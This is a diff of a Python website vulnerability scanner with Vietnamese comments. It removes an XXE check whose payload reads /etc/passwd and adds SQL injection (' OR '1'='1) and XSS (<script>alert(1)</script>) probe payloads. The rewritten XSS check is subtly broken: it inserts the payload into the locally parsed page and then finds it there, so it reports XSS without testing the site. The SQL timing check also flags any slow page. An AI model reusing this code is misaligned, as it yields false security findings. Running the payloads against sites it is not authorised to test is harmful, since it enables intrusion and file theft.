@@ -1,7 +1,6 @@
 import requests
 from urllib.parse import urljoin
 from bs4 import BeautifulSoup
-import re
 
 
 def scan_website(url):
@@ -22,9 +21,6 @@ def scan_website(url):
             
         if check_lfi(u):
             results.append({'url': u, 'vuln': 'Local File Inclusion'})
-        
-        if check_xee(u):
-            results.append({'url': u, 'vuln': 'XML External Entity'}) 
             
     return results
         
@@ -42,49 +38,55 @@ def crawl(url):
 
 # Hàm kiểm tra SQL injection
 def check_sqli(url, response):
-  # Kiểm tra xem có chứa các từ khóa như union, select, insert, update, delete,...
-  if re.search('union|select|insert|update|delete',response.text,re.I):
-    return True
+  test_urls = [f"{url}' OR '1'='1", f"{url}' AND '1'='2"]
   
-  # Kiểm tra dấu hiệu lỗi database
-  error_msgs = ['Warning','Error','SQL','Failed','Rejected']
-  for msg in error_msgs:
-    if msg in response.text:
+  for test_url in test_urls:
+    response = requests.get(test_url)  
+    if check_error(response):
       return True
       
-  # Kiểm tra thời gian response
-  if response.elapsed.total_seconds() > 1:
+  return False
+
+def check_error(response):
+  # Kiểm tra nội dung lỗi 
+  if "SQL syntax" in response.text:
     return True
-  
+  # Kiểm tra time delay
+  if response.elapsed.total_seconds() > 1:  
+    return True
+    
   return False
 
-def check_xee(url):
-
-  xee_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>  
-  <!DOCTYPE foo [ <!ENTITY xee SYSTEM "file:///etc/passwd" > ]>
-  <root>&xee;</root>'''
-
-  response = requests.post(url, data=xee_payload)
-
-  if "root:" in response.text:
-     return True
-  
-  return False
 
 # Hàm kiểm tra XSS
 def check_xss(url, response):
-  # Chèn Javascript alert vào URL
-  xss_url = url + "<script>alert('XSS')</script>"
-  xss_response = requests.get(xss_url)
-  
-  # Nếu có alert, là có lỗ hổng XSS
-  if "<script>alert('XSS')" in xss_response.text:
+
+  soup = BeautifulSoup(response.content, 'html.parser')
+
+  # Tìm các input, form để test XSS
+  inputs = soup.find_all('input')
+  forms = soup.find_all('form')
+
+  test_payload = "<script>alert(1)</script>"
+
+  # Test XSS trên input fields
+  for input in inputs:
+    input['value'] = test_payload
+
+  # Test XSS trên forms
+  for form in forms:
+    form.findAll('input', {'name': True})[0]['value'] = test_payload
+
+  # Kiểm tra xem có script reflect lại không
+  if test_payload in str(soup):
+    print("Reflected XSS detected by BeautifulSoup")
     return True
   
+  print("BeautifulSoup XSS test negative")
   return False
-  
-# Hàm kiểm tra LFI  
 
+
+# Hàm kiểm tra LFI  
 def check_lfi(url):
 
   pwd_paths = []
